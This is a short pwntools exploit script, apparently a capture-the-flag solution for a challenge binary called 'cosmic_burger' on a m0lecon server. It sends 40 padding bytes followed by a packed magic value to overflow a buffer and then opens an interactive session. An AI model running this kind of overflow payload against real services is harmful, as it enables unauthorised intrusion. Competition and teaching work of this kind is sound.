#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./cosmic_burger', checksec=False)

p = remote("offsec.m0lecon.it", 13565)

food = 0xbeef0000f00d


# Your exploit here

p.recvuntil(b"What's your order?")
payload = flat(
    b'A' * 40,
    p64(food)
)
p.send(payload)

p.interactive()
